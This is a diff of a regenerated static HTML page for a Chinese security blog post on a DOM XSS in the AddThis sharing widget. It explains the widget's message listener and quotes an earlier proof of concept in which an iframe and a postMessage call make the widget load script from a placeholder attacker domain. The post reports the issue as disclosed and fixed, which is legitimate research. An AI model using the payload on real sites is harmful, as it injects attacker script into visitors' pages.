@@ -66,7 +66,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="XSS,安全," />
+  <meta name="keywords" content="安全,XSS," />
 
 
 
@@ -84,25 +84,22 @@
 
 
 
-<meta name="description" content="背景说明：这个漏洞是 https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/ 修复的绕过，目前已经报告给AddThis并得到修复。
-
-AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容">
+<meta name="description" content="背景说明：这个漏洞是 https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/ 修复的绕过，目前已经报告给AddThis并得到修复。  AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容">
+<meta name="keywords" content="安全,XSS">
 <meta property="og:type" content="article">
 <meta property="og:title" content="分享插件AddThis导致的DOM XSS">
 <meta property="og:url" content="http://zhchbin.github.io/2016/12/25/DOM-XSS-Caused-by-AddThis/index.html">
 <meta property="og:site_name" content="zhchbin">
-<meta property="og:description" content="背景说明：这个漏洞是 https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/ 修复的绕过，目前已经报告给AddThis并得到修复。
-
-AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容">
+<meta property="og:description" content="背景说明：这个漏洞是 https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/ 修复的绕过，目前已经报告给AddThis并得到修复。  AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://ww4.sinaimg.cn/large/7184df6bgw1fb30n0dmyqj20nd08o0wd.jpg">
 <meta property="og:image" content="http://ww4.sinaimg.cn/large/7184df6bgw1fb30nhwnasj20rq0bddho.jpg">
 <meta property="og:image" content="http://ww3.sinaimg.cn/large/7184df6bgw1fb3110ele5j21340em79m.jpg">
+<meta property="og:updated_time" content="2017-08-30T15:14:42.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="分享插件AddThis导致的DOM XSS">
-<meta name="twitter:description" content="背景说明：这个漏洞是 https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/ 修复的绕过，目前已经报告给AddThis并得到修复。
-
-AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容">
-
+<meta name="twitter:description" content="背景说明：这个漏洞是 https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/ 修复的绕过，目前已经报告给AddThis并得到修复。  AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容">
+<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/7184df6bgw1fb30n0dmyqj20nd08o0wd.jpg">
 
 
 
@@ -317,19 +314,19 @@ AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公�
       
 
       
-        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>说明：这个漏洞是 <a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/" target="_blank" rel="external">https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/</a> 修复的绕过，目前已经报告给AddThis并得到修复。</p>
+        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>说明：这个漏洞是 <a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/" target="_blank" rel="noopener">https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/</a> 修复的绕过，目前已经报告给AddThis并得到修复。</p>
 <blockquote>
-<p>AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等<br>From <a href="https://zh.wikipedia.org/wiki/AddThis" target="_blank" rel="external">https://zh.wikipedia.org/wiki/AddThis</a></p>
+<p>AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等<br>From <a href="https://zh.wikipedia.org/wiki/AddThis" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/AddThis</a></p>
 </blockquote>
 <p>使用的例子有：</p>
 <p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30n0dmyqj20nd08o0wd.jpg" alt=""></p>
 <p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30nhwnasj20rq0bddho.jpg" alt=""></p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用这款插件，需要在网页上加入类似以下的代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Go to www.addthis.com/dashboard to customize your tools --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ceb912f1cca19"</span> <span class="attribute">async</span>=<span class="value">"async"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Go to www.addthis.com/dashboard to customize your tools --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ceb912f1cca19"</span> <span class="attr">async</span>=<span class="string">"async"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>当插件加载完成后，就会监听<code>message</code>事件。</p>
 <p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1fb3110ele5j21340em79m.jpg" alt=""></p>
 <p>看完前面提到的那篇文章之后，我们可以知道在这个事件处理函数中，如果<code>message</code>事件处理函数接收到一个 <em>合法来源</em> 的消息，消息内容如下：<code>at-share-bookmarklet://example.com/xss.js</code>时，就会动态在页面中插入指定的JS脚本。之前的漏洞是在这里根本没有检查消息的来源就直接加载执行导致了DOM XSS，原先的PoC：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">id</span>=<span class="value">"frame"</span> <span class="attribute">src</span>=<span class="value">"https://targetpage/using_addthis"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'frame'</span>).contentWindow.postMessage(<span class="string">'at-share-bookmarklet://ATTACKERDOMAIN/xss.js'</span>, <span class="string">'*'</span>);</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"frame"</span> <span class="attr">src</span>=<span class="string">"https://targetpage/using_addthis"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'frame'</span>).contentWindow.postMessage(<span class="string">'at-share-bookmarklet://ATTACKERDOMAIN/xss.js'</span>, <span class="string">'*'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>AddThis对这个漏洞进行的修复如下：</p>
 <ol>
 <li>添加检查当前窗口是不是被嵌套在：<code>iframe</code>, <code>frame</code>等标签里，如果是，则不监听<code>message</code>事件。</li>
@@ -374,9 +371,9 @@ AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公�
       
         <div class="post-tags">
           
-            <a href="/tags/XSS/" rel="tag">#XSS</a>
-          
             <a href="/tags/安全/" rel="tag">#安全</a>
+          
+            <a href="/tags/XSS/" rel="tag">#XSS</a>
           
         </div>
       
@@ -575,7 +572,7 @@ AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公�
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text"><a href="#&#x80CC;&#x666F;" class="headerlink" title="&#x80CC;&#x666F;"></a>&#x80CC;&#x666F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text"><a href="#&#x5206;&#x6790;" class="headerlink" title="&#x5206;&#x6790;"></a>&#x5206;&#x6790;</span></a></li></ol></div>
             
           </div>
         </section>
@@ -594,7 +591,7 @@ AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公�
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
